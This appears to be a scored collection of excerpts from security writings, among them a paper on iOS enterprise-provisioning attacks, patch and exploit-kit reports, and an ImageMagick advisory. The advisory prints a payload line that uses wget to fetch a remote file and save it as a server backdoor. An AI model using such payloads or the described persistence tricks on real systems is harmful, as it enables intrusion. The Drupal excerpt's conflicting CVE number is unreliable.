"Apple has a strict review process for apps published in its App Store - which, although not perfect, provides good protection for iOS users and makes it difficult for malware to exist in the App Store. However, apps may also be distributed using enterprise provisioning profiles without having to go through this review process - and apps distributed in this way have become a new attack vector. In their VB2014 paper, Tao Wei and colleagues explain the risk of an attacker distributing apps using enterprise provisioning profiles to conduct targeted attacks, including remote installation through spear phishing, autostart after reboot, background monitoring, and bypassing certificate revocation.",0.01436909829274391
Copyright © 2014 Virus Bulletin,0.00985395798510491
"Abstract
Apple has a strict review process for apps published in its App Store. The review guidelines not only disallow use of the powerful private APIs but also forbid dangerous or deceptive behaviours. The review process, though imperfect, provides good protection for iOS users and makes it difficult for malware to exist in the App Store. However, apps may also be distributed using enterprise provisioning profiles without having to go through such a review process. Apps distributed in this way have become a new attack vector. Attackers can launch targeted attacks by delivering malicious apps leveraging private APIs to the victim’s device. In this paper, we explain the risk of an attacker distributing apps using enterprise provisioning profiles to conduct targeted attacks, including remote installation through spear phishing, autostart after reboot, background monitoring and bypassing certificate revocation. We show that serious, targeted attacks on iOS are both feasible and realistic. We also discuss the implications this has on the iOS security architecture and the challenges of addressing them.",0.018427728560295842
"1. Introduction
By the end of 2013, the number of iOS users had reached 800 million [1] and there were over one million apps in the iOS App Store [2]. Despite the platform’s popularity, little iOS malware has been discovered [3]. It has also been reported [4] that iOS is more secure than Android due to its controlled distribution channel and rigorous app review process. However, there are still potential risks for iOS systems.
There are limited attack surfaces for traditional targeted attacks against iOS devices. While distributing malware through the App Store is difficult, spear phishing and drive-by downloads are not easy either. Attacks against Safari and PDF readers call for advanced skills, and Apple can fix these vulnerabilities by pushing out updates quickly.
In contrast, this paper describes a new type of security risk for iOS devices, where attackers may potentially utilize a bigger attack surface, which becomes harder to fix. This new type of risk leverages Apple’s enterprise program that can distribute apps to an unlimited number of devices without going through Apple’s app review process. By bypassing the review process, a malicious app can employ powerful private APIs hidden in iOS’s frameworks to steal sensitive information and attack various vulnerabilities on the system.
In contrast to traditional attacks that have limited attack surface, a malicious app installed through enterprise provisioning profiles can conduct malicious behaviours by abusing private APIs, deceiving users with fake UIs, or exploiting all kinds of known or even zero-day vulnerabilities. It’s hard for Apple to cope with apps outside of the App Store, which don’t comply with its review guidelines, and hard for it to stop them from attacking existing vulnerabilities.
The malicious apps may also use tricks to ensure that they are launched automatically after the system reboots and that they keep running in the background continuously. Given that these apps can use private APIs, they may, for example, monitor the user continuously by silently logging the user’s inputs in the background, even without bypassing the sandbox.
In this paper, we study the security risk posed by this new attack method and examine every step involved in a potential campaign. In section 2, we describe Apple’s review process for apps in the App Store and what kind of protections it enforces. Section 3 explains the power of private APIs, and Section 4 explains how enterprise distribution works. Section 5 studies the new attack vector made possible by using private APIs in apps distributed using enterprise provisioning. Section 6 discusses related issues, including the implications of iOS security architecture and the challenges in addressing them. Section 7 gives a conclusion.",0.018205509469000236
"2. Apple review process
Apple’s review process enforces a set of review guidelines [5], which includes over 100 rules. The rule categories cover various aspects, such as user interface, location, push notifications, trademarks, violence, religion, gambling, charities, privacy and advertising. Here are some examples of the rules extracted from [5]:
Apps that crash will be rejected.
Apps that include undocumented or hidden features inconsistent with the description of the app will be rejected.
Apps that use non-public APIs will be rejected.
Apps that read or write data outside their designated container areas will be rejected.
Apps that download code in any way or form will be rejected.
Apps that install or launch other executable code will be rejected.
Apps that duplicate apps already in the App Store may be rejected, particularly if there are many of them, such as fart, burp, flashlight, and Kama Sutra apps.
Apps that are intended to provide trick or fake functionality that are not clearly marked as such will be rejected.
Multitasking apps may only use background services for their intended purposes: VoIP, audio playback, location, task completion, local notifications, etc.
Apps that browse the web must use the iOS WebKit framework and WebKit JavaScript.
If you attempt to cheat the system (for example, by trying to trick the review process, steal data from users, copy another developer’s work, or manipulate the ratings) your apps will be removed from the store and you will be expelled from the developer program.
Apps that create alternate desktop/home screen environments or simulate multi-app widget experiences will be rejected.
Apps cannot transmit data about a user without obtaining the user’s prior permission and providing the user with access to information about how and where the data will be used.
Location data can only be used when directly relevant to the features and services provided by the app to the user or to support approved advertising uses.
Apple uses the review process to prevent apps from conducting undesirable behaviours. However, if attackers can bypass the review process, they can break all these rules and carry out malicious behaviours that have severe security consequences on a victim’s device. For example, attackers can use iOS private APIs for powerful attacks.",0.018815627999630102
"3. Private APIs
iOS apps interact with the underlying system using Application Programming Interfaces (APIs). However, not all APIs are equally open to app developers. Apple forbids some of the APIs, known as ‘private APIs’, from being used in the apps on App Store. Apple stipulates that these private APIs should only be used by the framework classes internally or by the iOS system apps [5], and these private APIs remain undocumented.
Private APIs are considerably more powerful than their public API counterparts. For example, on iOS 6.0, one app can call some public Twitter APIs to post a Tweet on the user’s Twitter page (Figure 1) and the user must consent by clicking the ‘post’ button. On the contrary, by using private APIs, the app can post the Tweet without notifying the user [8] at all.
Figure 1. Public Twitter APIs are called to post a Tweet on the user’s Twitter page – the user must click the ‘post’ button.
Though Apple forbids the use of private APIs, and provides no documentation about them, an attacker can still obtain a list of private APIs. To do so, one can begin by using otool [12] or classdump [13] to obtain a complete list of APIs, both public and private, from the iOS framework binaries shipped within the SDK. One can then obtain private APIs by subtracting the documented public APIs [14]. Table 1 lists several examples of private APIs.
Method
Framework
Usage
iOS 6.x availability
iOS 7.x availability
CTSIMSupportCopyMobileSubscriberIdentity()
Core telephony
Get Device IMSI
Yes
No
[[UIDevice currentDevice] UniqueIdentifier]
UIKit
Get Device UDID
Yes
No
SBSCopyApplicationDisplayIdentifiers()
SpringBoardServices
Get the array of current running app bundle IDs
Yes
No
[[CTMessageCenter sharedMessageCenter] incomingMessageWithId: result]
Core telephony
Get the text of the incoming SMS message
Yes
Yes
MobileInstallationLookup()
Mobile installation
Get the bundle ID list of installed iOS apps
Yes
Yes
Table 1. Private API examples.",0.02135400018361222
"Review process vs. private APIs
Apple forbids apps in the App Store from using private APIs, and bans app developers/vendors who do so. In February 2012, Apple banned all apps from Qihoo [6], a prominent Chinese anti-virus, web browser and search engine vendor. This major incident happened because Qihoo used iOS private APIs and encrypted the function calls in its iOS apps – Apple has a policy that forbids any non-Apple apps in its App Store from using private APIs.",0.015050213220166309
"4. Distributing iOS apps through enterprise provisioning
Besides the iOS App Store, iOS apps can also be distributed under enterprise provisioning profiles to an unlimited number of users. The iOS Developer Enterprise Program [15] enables a company to sign in-house apps with its enterprise distribution certificate and distribute the apps to employees using enterprise provisioning profiles.
In practice, many app developers use this venue to distribute apps to the public [10]. As mentioned before, apps distributed in this manner don’t have to go through Apple’s review process [5] and don’t have to conform to the rules in Apple’s guidelines on library usage, privacy, user interface, etc. Thus, not only can these apps freely use private APIs, they can also do other tricks such as mimicking apps originally bundled with the device, such as App Store or iTunes Store, or creating alternative home screen environments.
Distributing apps using enterprise provisioning profiles combined with unregulated usage of private APIs creates a new attack vector that enables attackers to distribute malware leveraging private APIs. Benign apps distributed under enterprise provisioning profiles also become valuable targets for attackers since many of them use private APIs.",0.020561609639541123
"4.1 Revocation of enterprise certificates
Apple may revoke an enterprise distribution certificate, if it suspects abuse. Revoking a distribution certificate invalidates all of the apps that have been signed with it. Apple allows the enterprise apps to be used by employees of the developer company only, rather than by everyone in the public. For this reason, Apple revoked the enterprise distribution certificate of Qihoo, which released its ‘enterprise’ apps to the public [7].
Apple uses the Online Certificate Status Protocol (OCSP) to validate enterprise certificates. According to the iOS Deployment Technical Reference [15], the first time a user opens an app distributed using the enterprise provisioning profile, iOS contacts Apple’s OCSP server to validate its distribution certificate. A revoked distribution certificate will prevent the app from launching. The OCSP response will be cached on the device for three to seven days [15]. However, ‘inability to contact or get a response from the OCSP server isn’t interpreted as a revocation’ [15]. That means iOS won’t prevent the app from launching if it can’t reach the OCSP server.",0.019111550957299994
"4.2 Real-world apps distributed through enterprise provisioning
We collected 1,408 apps from the Internet which were distributed through enterprise provisioning. We parsed each app’s Info.plist file to determine its development region. As shown in Table 2, most apps were from the United States, China, England and France.
Country
Number of apps
United States
660
China
361
England
223
France
62
Others
102
All
1408
Table 2. App numbers by development region.
Since these apps don’t go through Apple’s review process, they can abuse the powerful private APIs. We found that, within these 1,408 apps, 844 (60%) used private APIs.",0.01844830000972142
"5. Targeted attacks through enterprise provisioning
Figure 2 shows the steps in a targeted attack using enterprise certificates. Conceptually, the attacker first sends out a spear phishing email or SMS to the victim, who may be lured to click on a link and install the app. Once the victim launches the app, it can leverage private APIs and some exploits to keep monitoring the user, steal sensitive information in the background, and avoid being invalidated by Apple.
Figure 2. Targeted attacks against iOS through enterprise provisioning.",0.013939000565108772
"5.1 Spear phishing through enterprise provisioning
An attacker may lure a victim to install an app through a spear phishing email or SMS that contains a web link. Once the user clicks on the link, there will be a pop-up letting the user install the app, as shown in Figure 3. If the user chooses to install and launch the app, it can, with the help of private APIs, keep monitoring the user and steal sensitive information in the background.
Figure 3. Installing an enterprise app.",0.012201029602151192
"5.2. Persistent monitoring
After installation, the malicious app can monitor the victim’s activity continuously, including on occasions when it is switched to the background or the system reboots.
While malware can use standard ‘background app refresh’ to monitor the system continuously, iOS7 provides a setting for ‘background app refresh’ that will disable unnecessary background refreshing, and may prevent malware from working. However, this can be bypassed. For example, an app can play music in the background without turning on its ‘background app refresh’ switch. Thus a malicious app can disguise itself as a music app to conduct background monitoring.
On iOS, ordinary apps can’t start automatically after rebooting. However, VoIP apps are allowed to start automatically after the system reboot. Apple forbids non-VoIP apps in the App Store from using this feature. However, without being regulated by Apple’s review process, the attacker can disguise a malicious app as a VoIP app, which enables the app to start automatically after the device reboots, and thus monitor the victim continuously. Specifically, the malicious app can include the ‘voip’ value in the UIBackgroundModes key so that the system allows it to run in the background and launches it in the background again after system reboot.",0.01567168765809801
"5.3 Disabling OCSP
Apple will validate the status of enterprise certificates roughly every three to seven days, at which point it has the chance of finding some abnormal behaviour and disabling the corresponding apps. To prevent this, attackers can disable OCSP.
Attackers may leverage existing exploits to modify the device’s OCSP cache to maintain a valid state for its certificate.
Based on the findings from Wang et al. [16], under certain conditions, syslogd will do ‘chmod 777’ and ‘chown mobile’ to ‘/var/mobile/Library/Logs/CrashReporter’. Thus, the malicious app can evade the sandbox and replace /var/mobile/Library/Logs/CrashReporter with a symbolic link to some other part of the system. This will be changed to writeable by syslogd, which doesn’t carry out proper checks on symbolic links. The malicious app can then modify the OCSP cache to keep its OCSP response valid all the time.",0.014417608767110957
"5.4 Attacks by abusing private APIs
Private APIs are powerful. However, since private APIs are not intended to be available to app developers, their design may not have sufficient security considerations.
In February 2014, we found a vulnerability in iOS private APIs [11] which meant that a malicious app making use of certain private APIs can monitor a user’s input. In this attack, a malicious app can use a private API IOHIDEventSystemClientRegisterEventCallback() method within IOKit.framework to register a callback to receive system wide user input. This vulnerability can enable malware to record all of the user’s touch/press events in the background, including touches on the screen, home button press, volume button press, and TouchID presses, as shown in Figure 4. Attackers can use such information to reconstruct every character the victim inputs. Upon our notification, Apple issued CVE-2014-1276 for this issue and pushed out a fix shortly afterwards.
Figure 4. Background monitoring.
We have since found (and notified Apple about) another flaw on iOS 7 devices that enables telephone and SMS activity to be monitored from the background. Malware can register a callback by using the ‘CTTelephonyCenterAddObserver’ function in the CoreTelephony.framework and then it can record all of the telephone and SMS events in the background, including incoming phone number, the SMS sender’s number and SMS content, and then it can send all user events to any remote server. In this way, malware can eavesdrop on sensitive communication and bypass two-factor authentication based on SMS.",0.014283544696993222
"5.5 Attacks by deceptive behaviours
The App Store review guidelines [5] list many app behaviours as forbidden. However, these behaviours become possible for an app distributed with enterprise provisioning. We list two cases where the attacker can break the guidelines for malicious activities. Attackers can do more based on their social engineering techniques:
A malicious app may create alternative home screen environments or mimic the apps bundled on iPhone, such as App Store and iTunes Store. By doing so, the attacker can trick the user into using a fake iTunes Store app, and prompt the user to enter their password. For a user who lacks security knowledge, this phishing prompt may be enough for the attacker to steal the user’s Apple ID password successfully.
A malicious app may also disguise itself as another popular app and lure the user to use it. The attacker can embed malicious code inside such fake apps to carry out further attacks.",0.019482661084877284
"5.6 Attacks by using root exploits
It’s known that Apple can’t fix all known vulnerabilities, or may fix them incorrectly [16]. Malware installed through enterprise provisioning has more freedom to exploit known or zero-day vulnerabilities. Attackers can even use dynamic code downloading to prevent the exploit from being captured by security vendors.",0.012399106911744173
6. Discussion,0.009142685595427302
"6.1 UDID and ad-hoc provisioning
Besides enterprise certificates, apps can also be distributed using ad-hoc provisioning. Compared with enterprise certificates, ad-hoc distribution has the limitation that each development account can only distribute to 100 devices per membership year. Each of the devices receiving apps will have its unique device ID (UDID) registered in the ad-hoc provisioning profile to use the app. However, stealing the UDID from a target device on which the attacker wants to install a malicious app is not a hard job. Previously stealing the UDID may be treated just as private information leakage.
However, stealing the UDID is a crucial link towards targeted attacks: attackers can use the UDID to deliver ad-hoc distributed apps to the victim’s phone.",0.017106870050795142
"6.2 Abusing private APIs through bypassing review
Since private APIs are loaded as framework code into the app’s address space, together with the app developer’s own code, there are no obstacles to calling private APIs from a technical perspective. Apple does prohibit doing so. However, works like Jekyll [8] have shown the possibility of bypassing Apple’s review process.
Fooling Apple still has the risk of being banned once caught [6]. However, since distributing apps using enterprise certificates avoids the App Store, there’s no regulation on usage of private APIs. Currently, Apple doesn’t have an ideal way to supervise and manage these enterprise certificates.",0.012411579631804615
"6.3 Challenges of iOS security architecture against targeted attacks
While Apple does a good job of protecting ordinary App Store users from being infected by malware, there is still a big gap for enterprise security. Targeted attacks through enterprise provisioning pose a severe threat for enterprise users. Once attackers compromise victims’ devices, they can access useful information such as intellectual property, steal numerous accounts of cloud services, and take photos or record audio/video through iOS devices.
Currently, security on iOS runs into a dilemma: Apple doesn’t allow security vendors to implement system-level protections, whereas malware can freely call powerful private APIs and exploit vulnerabilities through enterprise provisioning. Furthermore, since most iPhones can access the Internet directly through their carriers (e.g. AT&T and Verizon) when they are not connected to a company-managed wireless network, classic network security devices in company networks can’t protect these devices all the time.
In the long run, Apple needs more investment in improving enterprise-level security against advanced targeted attacks. Apple should consider bringing dedicated security vendors into its platform to help with enterprise-level security solutions.",0.017385168380089078
"7. Conclusion
Though Apple enforces a rigorous review process forbidding apps on App Store from conducting many dangerous/deceptive behaviours, enterprise provisioning becomes a valid venue for apps to circumvent Apple’s regulations. Apps distributed using enterprise provisioning profiles can abuse powerful private APIs, deceive users and exploit vulnerabilities, thus becoming a severe threat to enterprise users. Using these apps, an attacker can use a bigger attack surface to launch persistent and targeted attacks against the victim’s device. Apple may improve its architecture to co-operate with security vendors in order to provide a better enterprise-level security solution.",0.01956062696997618
"Bibliography
[1] Tim Cook to shareholders: iPhone 5s/c outpace predecessors, Apple bought 23 companies in 16 months. http://appleinsider.com/articles/14/02/28/tim-cook-at-shareholder-meeting-iphone-5s-5c-outpace-predecessors-apple-bought-23-companies-in-16-months.
[2] How Many Apps Are in the iPhone App Store. http://ipod.about.com/od/iphonesoftwareterms/qt/apps-in-app-store.htm.
[3] Felt, A. P.; Finifter, M.; Chin, E. Hanna, S.; Wagner, D. A survey of mobile malware in the wild. In Proceedings of the 1st ACM workshop on Security and privacy in smartphones and mobile devices, pp.3–14. ACM, 2011.
[4] When Malware Goes Mobile. http://www.sophos.com/en-us/security-news-trends/security-trends/malware-goes-mobile/why-ios-is-safer-than-android.aspx.
[5] App store review guidelines. https://developer.apple.com/appstore/resources/approval/guidelines.html.
[6] Apple Bans Qihoo Apps From iTunes App Store. February 2012. http://www.techinasia.com/apple-bans-qihoo-apps/.
[7] Qihoo Double Blow as iOS Apps Banned by Apple, China Warns of Anti-Competitive Practices. January 2013. http://www.techinasia.com/qihoo-apps-banned-apple-app-store/.
[8] Wang, T.; Lu, K.; Lu, L.; Chung, S.; Lee, W. Jekyll on iOS: when benign apps become evil. Presented as part of the 22nd USENIX Security Symposium, pp.559–572, 2013.
[9] CVE-2014-1276. http://support.apple.com/kb/HT6162.
[10] How Apple’s Enterprise Distribution Program was abused to enable the installation of a GameBoy emulator. 2014. http://www.imore.com/how-gameboy-emulator-finding-its-way-non-jailbroken-devices.
[11] Background Monitoring on Non-Jailbroken iOS 7 Devices – and a Mitigation. http://www.fireeye.com/blog/technical/2014/02/background-monitoring-on-non-jailbroken-ios-7-devices-and-a-mitigation.html.
[12] otool. https://www.opensource.apple.com/source/cctools/cctools-499/otool/.
[13] classdump. http://stevenygard.com/projects/class-dump/.
[14] iOS Developer Library Reference. https://developer.apple.com/library/ios/navigation/#section=Resource%20Types&topic=Reference.
[15] iOS Deployment Technical Reference. http://images.apple.com/iphone/business/docs/iOS_Deployment_Technical_Reference_EN_May14.pdf.
[16] Exploiting unpatched iOS vulnerabilities for fun and profit. https://www.blackhat.com/us-14/briefings.html#exploiting-unpatched-ios-vulnerabilities-for-fun-and-profit.
",0.018937620706644176
VideoLAN 1.1.4.1,0.007968241145168142
"Posted by Roger on 1 October 2010, 8:32 pm",0.012458920990636613
"VLC Media Player  1.1.4.1 was released on September 27.   This is listed as a security update.   What’s weird is the news section says the security update is CVE-2010-2937 / VideoLAN-SA-1004.   That bulletin number was for a previous patch 1.1.3.
",0.011038698199419827
"Certified public accountants, beware what you click on!
Cybercriminals are currently spamvertising millions of emails impersonating AICPA (American Institute of Certified Public Accountants) in an attempt to trick users into clicking on the client-side exploits and malware serving links found in the emails.
More details:",0.015396992204134041
Screenshot of the spamvertised email:,0.01024206182675269
"Upon clicking on the links found in the malicious email, the following bogus “Page loading…” page is displayed:",0.011607537837026394
"Spamvertised URL: hxxp://thewebloan.com/wp-includes/notice.html
Client-side exploits serving URLs parked on the same IP (221.131.129.200) – hxxp://jeffknitwear.org/main.php?page=8614d3f3a69b5162; hxxp://lefttorightproductservice.org/main.php?page=4bf5d331b53d6f15
Client-side exploits serving domains responding to the same IP: toeplunge.org; teloexpressions.org; historyalmostany.org
Client-side exploits served: CVE-2010-1885
Detection rate for a sample redirection script with MD5: fa9daec70af9ae2f23403e3d2adb1484 is detected by 4 out of 42 antivirus scanners as Trojan.Script!IK; JS/Iframe.W!tr
Upon successful client-side exploitation, the campaign drops MD5: b00af54e5907d57c913c7b3d166e6a5a on the affected hosts. It’s currently detected by 29 out of 41 antivirus scanners as Trojan.PWS.YWO; Trojan-Dropper.Win32.Dapato.bmtv
Webroot SecureAnywere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.009210969704304905
"The 1337est Print Spooler bug fixed in August, 2020’s Patch Tuesday",0.00843777294001058
Windows fixes address 60 privilege escalations and 33 remote code execution bugs,0.008046573510246735
"Written by
Andrew Brandt,",0.009161029206781302
SophosLabs Offensive Security,0.008990065059669039
"August 11, 2020",0.009444533792305254
SophosLabs Uncut CVE-2020-1036 CVE-2020-1337 CVE-2020-1380 CVE-2020-1584 CVE-2020-1587 EoP Patch Tuesday print spooler RCE,0.009679285080607003
"Microsoft has squished 120 bugs in this month’s release of software updates spanning its product lines. While the total number of bugs that have been fixed this month dropped slightly compared to last month, the number of critical bugs fixed this month was higher, at 32, compared to July’s 20.
All but one of those critical fixes addressed a remote code execution vulnerability that affected the .NET framework (CVE-2020-1046), media codecs (CVE-2020-1560, -1574, -1585) and engines (CVE-2020-1379, -1477, -1492, -1525, -1554), scripting engines (CVE-2020-1555, -1567, -1570), and the Edge browser’s PDF renderer (CVE-2020-1568). The only non-RCE critical vulnerability is a privilege escalation that affects the Netlogon component (CVE-2020-1472).
The bug that affects the Print Spooler isn’t critical, but both the relatively old code (the bug affects systems as mature as Windows 7) and its assigned CVE number are notable. The bug was a subject of a talk at the Black Hat Briefings which took place last week. This privilege escalation bug, classified “important,” picked up the most elite reference of the year: CVE-2020-1337. Someone has a sense of humor.",0.011122812714557284
"The key identifies the products represented in the patch chart above
While readers can find the full details about every patch this month in Microsoft’s Security Update Guide Release Notes, and Servicing Stack Updates, and users can download patches manually from the Microsoft Security Update Catalog, the Offensive Research team passed along some notes about the patches they found most interesting.
Windows Spoofing Vulnerability
CVE-2020-1464
This vulnerability, formerly titled “Windows Authenticode Signature Spoofing Vulnerability,” has already been exploited in “in the wild” attacks. Authenticode is the component of Windows that validates cryptographically-signed binaries (eg., drivers) and executables. These are important because in latter-day editions of Windows 10, you can’t (for example) load driver files that have not been certified as valid by a legitimate signing authority.
Well, that’s an important security feature, since we’ve been observing for months that ransomware has been using a variety of bypasses to load unsigned driver files, which then are used to load the ransomware payload at a level where some endpoint security products are unable to prevent the ransomware from doing damage.
So while Microsoft has only classified this particular patch as “important,” and not “critical,” it’s actually quite critical that you install updates so your system cannot be abused in this way. Deferring the installation of this patch can have far reaching, negative consequences.
Scripting Engine Memory Corruption Vulnerability
CVE-2020-1380
As if we all didn’t need another reason not to use Internet Explorer anymore, something like this comes along. The bug is a Use After Free vulnerability, in the JIT compiler of Internet Explorer’s JavaScript engine. While bugs like this may lead to remote code execution and compromise if you visit the wrong website with Internet Explorer, we all know better than to use that browser, anymore. Right?
Right?
The bug itself is unremarkable and is similar to your average IE vulnerability that comes a dime a dozen.
If you’re still using Internet Explorer, and you aren’t teaching a lesson on computer history in a museum exhibit, please switch to a modern browser.
Windows dnsrslvr.dll Elevation of Privilege Vulnerability
CVE-2020-1584
the DNS Client network service’s main purpose is to cache DNS (Domain Name System) results, optimizing network communications. It’s enabled by default on Windows systems.
The bug (in the DNS Client’s dnsrslvr.dll library)  is an Integer Overflow vulnerability that, when triggered, results in an undersized memory allocation, and a subsequent memory corruption. It’s the memory corruption that may lead to arbitrary code execution.
The vulnerable code path is reachable by the RPC (Remote Procedure Call) invocation of certain methods implemented by the DNS Client service. This can be done by applications running on the same system. Upon successful exploitation, an application may elevate its privileges to that of a network service – “NT AUTHORITY\NETWORK SERVICE” privileges.
This is only the second time a vulnerability has been reported in dnsrslvr.dll, the previous one (CVE-2019-1090) only having been discovered last year.
Windows Ancillary Function Driver for WinSock Elevation of Privilege Vulnerability
CVE-2020-1587
The file afd.sys is the driver responsible for the Windows kernel’s side of Winsock (Windows Sockets) functionality. It has a Race Condition vulnerability: An attacker can attempt to “race” multiple threads into executing the vulnerable code concurrently. If the timing is precise, and the “race” is won, a Use After Free condition follows, and ultimately an attacker can run arbitrary code.
This bug was mitigated by the introduction of proper thread synchronization around the vulnerable code.
Despite the driver’s name and purpose, the bug itself is not part of networking code and is not reachable by network traffic. It is only triggerable by applications running on the same system. If such an application interacts with afd and successfully exploits the bug, it can escalate its privileges to Kernel privileges.
Sophos protection
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.",0.015577140189964922
"CVE
SAV
IPS",0.009183097362180814
"CVE-2020-1380
Exp/20201380-A
SID:9000225",0.0112444187754569
"CVE-2020-1567
Exp/20201567-A
SID:2303521",0.0115441825482685
"CVE-2020-1570
Exp/20201570-A
SID:2303522",0.011464669130663574
CVE-2020-1578,0.009506959489116396
SID:2303523,0.008143225179572555
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.",0.012693935054493566
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"New Internet Explorer 10 zero-day used in targeted attacks
A new and currently unpatched flaw affecting Internet Explorer 10 (CVE-2014-0322) has been discovered on some highly targeted websites, indicating a watering-hole type of attack.
I immediately tested this new exploit and was able to reproduce a successful infection on Windows 7, Internet Explorer 10 with the latest version of the Flash Player.",0.015876810189400015
"The vulnerability is a use-after-free bug that gives the attacker direct memory access at an arbitrary address using a corrupted Adobe Flash file. It then bypasses both Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP).
Here is a procmon screenshot showing Internet Explorer loading a dropped file:",0.014472918213408903
Malware binaries disguised as data or text files are dropped in %temp%\low:,0.007677159719227333
Malwarebytes Anti-Malware already detects and blocks those threats:,0.010942847670389888
"One of the files being dropped is digitally signed making it look like a legitimate application. Malware authors have abused digital certificates before and it’s still a reminder to approach all files with caution, signed or not.",0.016686676878396867
"Once again, this attack was very targeted and is not currently in any of the popular exploit kits we monitor. However, now that the information has been made public, it is a race between the bad guys and Microsoft, the latter working on a fix and release for its massive user base.
Malwarebytes Anti-Exploit BETA proactively blocked this exploit, requiring no signature or update to its engine. A short video clip of the exploit being stopped can be viewed here.",0.013460637381030649
"Users can also mitigate risk by avoiding Internet Explorer 10, upgrading to Internet Explorer 11 or choosing another browser.
We will continue to monitor the threat landscape as this exploit is already available for download and will be used on a wide scale soon.
@jeromesegura
Update: According to this news article from the TheNextWeb, Microsoft acknowledged the exploit and said that Internet Explorer 9 was also affected.
",0.01053226785194239
ImageMagick Remote Command Execution Vulnerability,0.008138747170595262
"ImageMagick is a popular software used to convert, edit and manipulate images. It has libraries for all common programming languages, including PHP, Python, Ruby and many others. It is also very simple to use, which lead it to be used by many developers when in need of image cropping or manipulation.
However, the latest versions of ImageMagick doesn’t properly filter the file names that get passed to the internal delegates that handle external protocols (like HTTPS). This allows an attacker to execute his own commands remotely by uploading an image. This leads to a full RCE (remote command execution) vulnerability in your image uploader. The vulnerability is so serious that researchers created a fun nick name for it which is easier to remember than just CVE-2016-3714: ImageTragick.",0.010187244633469872
"Vulnerability Details
Since the initial partial disclosure of this vulnerability our research team has been 100% focused on trying to create a workable proof of concept to understand the exploit and test our own protections against it. After many hours and some great help from the security community, we were able understand the vulnerability enough to create a simple PHP upload tool that uses ImageMagick, and the exploit to compromise it (hat tip to Cosmin, one our developers that help the research team there).
The vulnerability is very simple to exploit, an attacker only needs a image uploader tool that leverages ImageMagick. During our research we found many popular web applications and SaaS products vulnerable to it (people love gravatars), and we have been contacting them privately to get things patched. Unfortunately, even with all the media attention, not everyone is aware of this issue.
Going into a bit more details, this vulnerability can actually be divided in 4 different issues (or maybe 5, depending on who you ask), that is very well explained by Karim Valiev from the Mail.Ru Security Team here. So summarize, this is what we have to be aware:",0.012204668335607849
"Remote command execution on .mvg/.svg file uploads. By proving a malicious file, an attacker can force a shell command to be executed on the server. This is a very simple example being shared lately:
image Over 0,0 1,1 'url(https:"";wget ""http://pastebin.com/raw/badpastebin"" -O /home/vhosts/file/backdoor.pl"")'
When that gets added to a MVG file, the wget command is executed and the output of the pastebin file saved on backdoor.pl.
Remote file deletion. When using the “ephemeral:/” protocol, an attacker can remove files on the server
Remote file moving: Similar to the file deletion issue, but when using the “msl:/” pseudo protocol, the attacker can move files around
File content disclosure when using the “label:@” protocol.",0.010467102902530834
"When combining all these issues, the attackers have a wide range of options and tools to compromise a web application that leverages ImageMagick. Note that only filtering for MGV extension is not enough, as any file format will be inspected and the command executed.
I suspect a lot more vulnerabilities within ImageMagick will be found soon as more researchers are looking at it.
Also note that the latest signatures set for ModSecurity and others IDS tools do not detect or block this issue. We updated our WAF last night to virtually patch this vulnerability, users behind the Sucuri Firewall are now protected. We also went back looking for previous attacks and we didn’t see any in the wild, yet. That will likely change soon as attackers build their own exploits.
Protection
Users behind our WAF are already protected against this vulnerability, but we still recommend everyone to follow the ImageMagick developers recommendation and edit the /etc/ImageMagick/policy.xml file and disable the processing of MVG, HTTPS, EPHEMERAL, and MSL commands within image files. In the section, add the following lines:
<policymap>
...
<policy domain=""coder"" rights=""none"" pattern=""EPHEMERAL"" />
<policy domain=""coder"" rights=""none"" pattern=""HTTPS"" />
<policy domain=""coder"" rights=""none"" pattern=""URL"" />
<policy domain=""coder"" rights=""none"" pattern=""MVG"" />
<policy domain=""coder"" rights=""none"" pattern=""MSL"" />
</policymap>""
If you can not make those changes, I recommend disabling the image upload functionality for now until you can properly patch. Better safe than sorry.
",0.012584288915339248
"Magnitude Exploit Kit Activity Increases Via Malvertising Attacks
During the past few days we have noticed a higher than usual number of malvertising attacks pushing the Magnitude exploit kit – which had been relatively quiet – to drop ransomware.
Magnitude EK is one of those exploit kits we don’t hear about as much in comparison to others such as Angler EK or Nuclear EK. Its unique URL pattern makes it easy to spot from the clutter of network traffic captures because it uses chained subdomains typically ending in a shady Top Level Domain like pw (Palau Pacific island).",0.01840898895251164
Some of the ad networks involved in this malvertising campaign include:,0.011668843977725274
RevenueHits,0.012665348116555064
"rvfrm2006.com/adServe/sa?cid=11021-110100501933000000&pid=11021&q=ANUBiH%20-%20Prijava&ap=cmp%3DPOPUNDER
clkdeals.com/adServe/getTag?pid=11021&type=inject&cid=110100501933000000&appName=GoHD&q=id195.ea7u.c0.d6177f.53f.j2cb5n.8c974r.xe02c5.j19s72w2gq9.whatplea.pw",0.012246323724633301
VisAdd,0.008884050034971835
a.visadd.com/internal/reporter?v=2&subid=110100501933000000&format=0&ai=990&ctxu=http%3A//id195.ea7u.c0.d6177f.53f.j2cb5n.8c974r.xe02c5.j19s72w2gq9.whatplea.pw/&fb=false{redacted},0.01173939991831574
Propeller Ads Media,0.010694052331320258
"onclickads.net/?auction_id=d1586e4cbe6a34cf&zoneid=26518&pbk2=97419d16d0b3957f090d85f852f50a5c6216021660945859924&r=%2Foc%2Fhan
Perhaps this increased activity is due to the fact that Magnitude EK is the third exploit kit to leverage the latest Flash Player vulnerability (CVE-2015-7645) recently patched by Adobe.",0.009705718201126312
"CryptoWall was dropped via two separate malware binaries. Malwarebytes Anti-Exploit users were protected against Magnitude EK and never got to see the malware payload.
",0.01744812057517986
Drupal SQLi (Drupalgeddon) Attack Trend CVE-2014-3704 / SA-CORE-2014-005,0.012722996914620088
"It has been over 19 months since Drupalgeddon, which refers to Drupal’s Security Advisory (SA) SA-CORE-2014-005. For those unfamiliar with it, it was a highly critical SQL Injection (SQLi) vulnerability that allowed an attacker to arbitrarily execute SQL commands remotely, leading to potential privilege escalation issues and execution of PHP code on the server.  The vulnerability affected Drupal 7 and was patched by the Drupal core team in CVE-2015-3704.  The vulnerability was severe enough that the Drupal team released a public service announcement (PSA-2014-003) warning users who had not updated to presume they were being compromised:",0.00861358817429314
